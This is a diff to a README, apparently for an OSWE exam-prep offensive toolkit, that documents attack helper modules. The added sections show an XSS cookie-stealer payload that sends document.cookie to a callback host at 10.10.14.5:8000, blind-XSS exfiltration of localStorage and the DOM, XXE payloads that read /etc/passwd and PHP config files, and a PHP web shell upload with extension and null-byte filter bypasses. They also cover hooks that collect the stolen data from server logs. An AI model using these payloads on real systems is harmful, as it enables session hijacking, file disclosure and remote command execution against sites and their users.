@@ -116,6 +116,160 @@ event = get_event()  # {'type': 'cookie', 'data': '...', 'timestamp': '...'}
 drain_queue()
 ```
 
+## XSS Payloads (`utils/xss.py`)
+
+Generate XSS payloads with automatic callback integration:
+
+```python
+from utils.xss import img_onerror, blind_xss, cookie_stealer, polyglot
+
+# Quick test payload (img tag with onerror)
+payload = img_onerror(f"http://{lhost}:8000")
+# Returns: <img src=x onerror="fetch('http://10.10.14.5:8000/queue?cookie='+btoa(document.cookie))">
+
+# Blind XSS with full data exfil
+payload = blind_xss(f"http://{lhost}:8000", identifier="admin_panel")
+# Sends: cookies, localStorage, URL, DOM content
+
+# Polyglot (works in multiple contexts)
+payload = polyglot(f"http://{lhost}:8000")
+
+# Context-specific payloads
+from utils.xss import context_specific
+payload = context_specific(f"http://{lhost}:8000", context="attribute")
+# Contexts: html, attribute, js, css
+
+# Get stolen cookie
+from utils.server_hooks import get_cookie
+send_xss_payload(payload)
+cookie = get_cookie(timeout=30)
+```
+
+## XXE Payloads (`utils/xxe.py`)
+
+Generate XXE payloads for file reading and SSRF:
+
+```python
+from utils.xxe import quick_test, basic_file_read, php_filter_b64
+
+# Quick test (creates DTD + payload automatically)
+payload = quick_test(f"http://{lhost}:8000", "/etc/passwd")
+# Writes DTD to payloads/xxe/xxe.dtd, returns XML payload
+
+# Basic XXE (file content in response)
+payload = basic_file_read("/etc/passwd")
+
+# Read PHP source as base64
+payload = php_filter_b64("/var/www/html/config.php")
+
+# Format-specific XXE
+from utils.xxe import svg_xxe, soap_xxe
+svg_payload = svg_xxe(f"http://{lhost}:8000", "/etc/passwd")
+soap_payload = soap_xxe(f"http://{lhost}:8000", "/etc/passwd")
+
+# Get exfiltrated data
+from utils.server_hooks import get_exfil
+send_xxe_payload(payload)
+data = get_exfil(timeout=30)
+```
+
+## File Upload (`utils/file_upload.py`)
+
+Upload files with automatic bypass techniques:
+
+```python
+from utils.file_upload import FileUploader, quick_upload
+
+# Quick upload with all bypasses
+uploader = FileUploader("http://target/upload")
+result = uploader.upload_with_bypass(
+    "shell.php",
+    b"<?php system($_GET['cmd']); ?>",
+    techniques=["null_byte", "double_extension", "case_variation"]
+)
+
+# Simple upload
+result = uploader.upload("shell.php", php_code)
+
+# One-liner
+quick_upload("http://target/upload", "shell.php", php_code)
+```
+
+**Available bypass techniques:**
+- `null_byte`: filename.php%00.jpg
+- `double_extension`: filename.jpg.php
+- `case_variation`: filename.PHP
+- `mime_mismatch`: Send PHP as image/jpeg
+
+## Zip Utilities (`utils/zip_util.py`)
+
+Create and extract zip files (with zip slip protection):
+
+```python
+from utils.zip_util import quick_zip, zip_multiple, extract_zip
+
+# Quick zip (auto-detects file or folder)
+quick_zip("payloads/", output="payloads.zip")
+
+# Zip multiple files
+zip_multiple(
+    ["exploit.py", "shell.php", "config.json"],
+    output_path="poc.zip"
+)
+
+# Extract safely (prevents zip slip)
+extract_zip("archive.zip", extract_to="./extracted")
+```
+
+## Apache Hooks (`utils/apache_hooks.py`) - OSWE Fallback
+
+**Use this if exam requires Apache2 instead of the built-in server.**
+
+Same API as `server_hooks.py`, but reads from Apache access logs:
+
+```python
+from utils.apache_hooks import get_cookie, get_exfil, get_param
+
+# Get cookie from Apache logs (checks both ?cookie= and ?cookies=)
+cookie = get_cookie('/var/log/apache2/access.log', timeout=30)
+# Auto-decodes base64, returns most recent occurrence
+
+# Get exfiltrated data (looks for ?exfil=)
+data = get_exfil('/var/log/apache2/access.log', timeout=30)
+
+# Get any custom parameter
+value = get_param('data', '/var/log/apache2/access.log', timeout=30)
+
+# Watch log in real-time (for debugging)
+from utils.apache_hooks import watch_log
+watch_log('/var/log/apache2/access.log', params=['cookies', 'exfil'])
+```
+
+**How it works:**
+- Uses regex to find query parameters in Apache logs
+- Returns the **most recent** (last) match in the file
+- Auto-decodes base64-encoded values
+- URL-decodes values automatically
+
+**Quick migration from server_hooks:**
+```python
+# Development (with built-in server)
+from utils.server_hooks import get_cookie
+
+# Exam (with Apache)
+from utils.apache_hooks import get_cookie
+
+# Same function calls work with both!
+cookie = get_cookie(timeout=30)
+```
+
+**CLI watch mode:**
+```bash
+# Watch logs for interesting parameters
+python -m utils.apache_hooks watch
+python -m utils.apache_hooks watch /var/log/apache2/access.log cookies exfil data
+```
+
 ## Paths (`utils/paths.py`)
 
 Consistent access to project directories:
